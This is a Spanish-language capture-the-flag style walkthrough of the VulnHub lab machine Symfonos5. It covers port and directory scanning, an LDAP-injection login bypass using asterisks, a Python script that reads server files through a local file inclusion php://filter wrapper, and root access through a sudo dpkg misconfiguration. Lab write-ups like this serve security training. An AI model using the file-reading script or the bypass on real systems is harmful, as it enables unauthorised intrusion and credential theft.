---
layout: single
title: Symfonos5 - VulnHub
excerpt: "Symfonos5, una máquina vulnerable de VulnHub, presenta una vulnerabilidad de inyección LDAP que pudimos eludir en el inicio de sesión. Luego, a través de una vulnerabilidad de inclusión local de archivos (LFI), conseguimos obtener credenciales que nos permitieron autenticarnos en el servicio LDAP expuesto. Tras analizar el servicio, identificamos credenciales que utilizamos para iniciar sesión como el usuario 'zeus' a través de SSH. La escalada de privilegios se logró directamente a root mediante un error en la configuración de sudoers, al incluir una aplicación que nos proporcionó una shell."
date: 2023-11-04
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - rpcbind
  - mount
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)

Symfonos5, una máquina vulnerable de VulnHub, presenta una vulnerabilidad de inyección LDAP que pudimos eludir en el inicio de sesión. Luego, a través de una vulnerabilidad de inclusión local de archivos (LFI), conseguimos obtener credenciales que nos permitieron autenticarnos en el servicio LDAP expuesto. Tras analizar el servicio, identificamos credenciales que utilizamos para iniciar sesión como el usuario 'zeus' a través de SSH. La escalada de privilegios se logró directamente a root mediante un error en la configuración de sudoers, al incluir una aplicación que nos proporcionó una shell.



## Enumeracion

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```bash
# Nmap 7.93 scan initiated Fri Nov  3 06:59:59 2023 as: nmap -sCV -p22,80,389,636 -oN vulnscan.nmap 192.168.56.16
Nmap scan report for 192.168.56.16
Host is up (0.00027s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 1670137722f96878400d2176c1505423 (RSA)
|   256 a80623d093187d7a6b05778d8bc9ec02 (ECDSA)
|_  256 52c08318f4c738655ace9766f375684c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
MAC Address: 08:00:27:ED:4A:23 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  3 07:00:12 2023 -- 1 IP address (1 host up) scanned in 12.29 seconds
```

## Analisis 

La enumeración central empezara por el servicio http.


```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.56.16/FUZZ" -e .php,.txt,.html -t 200 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.16/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 207, Words: 18, Lines: 19, Duration: 33ms]
home.php                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
admin.php               [Status: 200, Size: 1650, Words: 707, Lines: 40, Duration: 3ms]
static                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 19ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 118ms]
portraits.php           [Status: 200, Size: 165, Words: 10, Lines: 4, Duration: 36ms]
                        [Status: 200, Size: 207, Words: 18, Lines: 19, Duration: 23ms]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 80ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 26ms]
```

Al examinar el archivo admin.php, notamos la presencia de un panel de inicio de sesión. Dada la utilización de LDAP, suponemos que el proceso de inicio de sesión está gestionado por este protocolo. Por lo tanto, llevamos a cabo un bypass, simplemente ingresando un asterisco tanto en el campo de usuario como en el de contraseña.

![](/assets/images/vulnhub-writeup-symfonos5/symfonos5-login.png)

 Si nos dirigimos a portraits podemos ver un potencial LFI.

![](/assets/images/vulnhub-writeup-symfonos5/symfonos5-nose.png)

La aplicación es vulnerable a una Inclusión Local de Archivos (LFI), por lo que optaremos por utilizar un wrapper que codifica el contenido de un archivo en base64. En este sentido, desarrollaré un script en Python para facilitar la lectura de archivos y agilizar el proceso.

```python
import requests,re,sys,base64

url="http://192.168.56.16/home.php?url=php://filter/convert.base64-encode/resource=" + sys.argv[1]
cookie = {"PHPSESSID":"dpao5t9vo0cuphgelo2mk3qf7v"}
regex = re.findall(r"<center>(.*?)</center>",requests.get(url,cookies=cookie).text,re.DOTALL)[0]
print(base64.b64decode(regex).decode())
```

Como primer paso, procedemos a determinar la ubicación de los archivos. Para ello, accederé al archivo /etc/apache2/sites-enabled/000-default.conf.

![](/assets/images/vulnhub-writeup-symfonos5/symfonos5-rutaWeb.png)

Analizamos el archivo admin.php para ver como gestiona la verificación de credenciales.

![](/assets/images/vulnhub-writeup-symfonos5/symfonos5-credenciales.png)

Nos logeamos en ldap para ver alguna información adiccional y vemos lo siguiente.

![](/assets/images/vulnhub-writeup-symfonos5/symfonos5-sshcredenciales.png)

Realizamos una prueba para verificar si las credenciales de 'zeus' son válidas para SSH.

![](/assets/images/vulnhub-writeup-symfonos5/symfonos5-conectarSsh.png)

La escalada de privilegios es bastante sencilla; ejecutamos 'sudo -l'.

```bash
zeus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg
```

Ejecutamos las instrucciones que nos indica gtfbins

![](/assets/images/vulnhub-writeup-symfonos5/symfonos5-gtfbins.png)

## Shell - Root 

![](/assets/images/vulnhub-writeup-symfonos5/symfonos5-root.png)
